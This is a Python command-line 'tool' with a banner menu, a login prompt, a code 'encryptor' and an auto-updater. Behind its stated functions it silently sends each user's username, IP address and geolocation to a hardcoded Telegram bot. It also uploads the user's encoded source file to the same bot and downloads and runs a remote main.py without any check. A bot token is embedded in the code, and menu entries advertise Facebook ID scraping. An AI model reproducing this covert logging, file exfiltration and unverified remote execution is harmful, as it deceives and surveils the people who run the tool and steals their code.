import os
import sys
import base64
import marshal
import zlib
import time
from datetime import datetime
import requests

# Telegram bot details
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID = "1241769879"

# Color class for colorized output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Function to send a message to your Telegram bot
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
    requests.get(url)

# Function to log user details (login)
def log_user_details(username, ip, geo_location, datetime_now):
    log_message = f"""
    [•] Login Details:
    [•] Username: {username}
    [•] IP Address: {ip}
    [•] Geolocation: {geo_location}
    [•] Date/Time: {datetime_now}
    """
    send_telegram_message(log_message)

# Function to get user's IP and geolocation
def get_ip_info():
    try:
        ip_info = requests.get('http://ipinfo.io/json').json()
        ip = ip_info.get('ip', 'N/A')
        geo_location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}, {ip_info.get('country', 'N/A')}"
        return ip, geo_location
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[•] Error getting IP info: {str(e)}{Colors.ENDC}")
        return 'N/A', 'N/A'

# Public Login Function
def login():
    print(f"{Colors.OKGREEN}[•] Public login to access the tool{Colors.ENDC}")
    
    username = input(f"{Colors.OKBLUE}[•] Enter your username: {Colors.ENDC}")
    
    # Check if the username is valid (non-empty)
    if not username.strip():
        print(f"{Colors.FAIL}[•] Invalid username! Please enter a valid username.{Colors.ENDC}")
        return
    
    # Get the user's IP and geolocation
    ip, geo_location = get_ip_info()
    datetime_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Log the user's login details
    log_user_details(username, ip, geo_location, datetime_now)

    print(f"{Colors.OKGREEN}[•] Welcome {username}! Access granted.{Colors.ENDC}")

# Function to encrypt the code
def encrypt_code():
    print(f"{Colors.OKGREEN}[•] Welcome to the Code Encryptor!{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[•] Please enter the file name to encrypt:{Colors.ENDC}")
    
    file_name = input(f"{Colors.OKGREEN}[•] File Name: {Colors.ENDC}")
    
    if not os.path.exists(file_name):
        print(f"{Colors.FAIL}[•] File does not exist!{Colors.ENDC}")
        return
    
    # Read the file content
    with open(file_name, "r") as file:
        code = file.read()
    
    print(f"{Colors.OKBLUE}[•] Choose encryption method:{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[1] Base64 Encode{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[2] Marshal Encode{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[3] Zlib Compress{Colors.ENDC}")
    
    choice = input(f"{Colors.OKBLUE}[•] Choose an option: {Colors.ENDC}")
    
    if choice == "1":
        encoded_code = base64.b64encode(code.encode()).decode()
        encrypted_file = f"enc_{file_name}.py"
    elif choice == "2":
        encoded_code = marshal.dumps(code)
        encrypted_file = f"enc_{file_name}.py"
    elif choice == "3":
        encoded_code = zlib.compress(code.encode())
        encrypted_file = f"enc_{file_name}.py"
    else:
        print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
        return
    
    # Save the encrypted code
    with open(encrypted_file, "w") as enc_file:
        enc_file.write(encoded_code)
    
    print(f"{Colors.OKGREEN}[•] File encrypted successfully: {encrypted_file}{Colors.ENDC}")
    
    # Send the encrypted code to Telegram bot as a file (if possible)
    try:
        with open(encrypted_file, "rb") as f:
            files = {'document': f}
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}"
            requests.post(url, files=files)
    except Exception as e:
        send_telegram_message(f"Encryption error: {str(e)}")

# Function to update the tool (github.py)
def update_tool():
    print(f"{Colors.OKGREEN}[•] Fetching and Running Latest Tool...{Colors.ENDC}")
    
    try:
        response = requests.get("https://raw.githubusercontent.com/t9cxy/alone-menu/refs/heads/main/main.py")
        with open("main.py", "wb") as file:
            file.write(response.content)
        
        print(f"{Colors.OKGREEN}[•] Updated successfully. Running main.py...{Colors.ENDC}")
        os.system("python3 main.py")
    except Exception as e:
        print(f"{Colors.FAIL}[•] Error updating tool: {str(e)}{Colors.ENDC}")
        send_telegram_message(f"Tool update error: {str(e)}")

# Main Menu
def main_menu():
    while True:
        print(f"{Colors.HEADER}██████╗ ██████╗ ███████╗██████╗ ██╗████████╗")
        print(f"██╔══██╗██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝")
        print(f"██████╔╝██║  ██║███████╗██████╔╝██║   ██║   ")
        print(f"██╔═══╝ ██║  ██║╚════██║██╔═══╝ ██║   ██║   ")
        print(f"██║     ██████╔╝███████║██║     ██║   ██║   ")
        print(f"╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝   {Colors.ENDC}")
        
        print(f"{Colors.OKBLUE}[1] Proxy Options{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[2] User-Agent Generator{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[3] Send HTTP Request{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[4] Look IP Info{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[5] Facebook IDs Extractor{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[6] Group Member ID Dumper{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[7] Encrypt Code{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[8] Rerun Tool (Auto-Update){Colors.ENDC}")
        print(f"{Colors.OKRED}[0] Exit{Colors.ENDC}")
        
        option = input(f"{Colors.OKBLUE}[•] Choose an option: {Colors.ENDC}")
        
        if option == "0":
            print(f"{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}")
            break
        elif option == "1":
            print(f"{Colors.WARNING}[•] Proxy Options (To be implemented){Colors.ENDC}")
        elif option == "2":
            print(f"{Colors.WARNING}[•] User-Agent Generator (To be implemented){Colors.ENDC}")
        elif option == "3":
            print(f"{Colors.WARNING}[•] Send HTTP Request (To be implemented){Colors.ENDC}")
        elif option == "4":
            print(f"{Colors.WARNING}[•] Look IP Info (To be implemented){Colors.ENDC}")
        elif option == "5":
            print(f"{Colors.WARNING}[•] Facebook IDs Extractor (To be implemented){Colors.ENDC}")
        elif option == "6":
            print(f"{Colors.WARNING}[•] Group Member ID Dumper (To be implemented){Colors.ENDC}")
        elif option == "7":
            encrypt_code()
        elif option == "8":
            update_tool()
        else:
            print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")

if __name__ == "__main__":
    login()
    main_menu()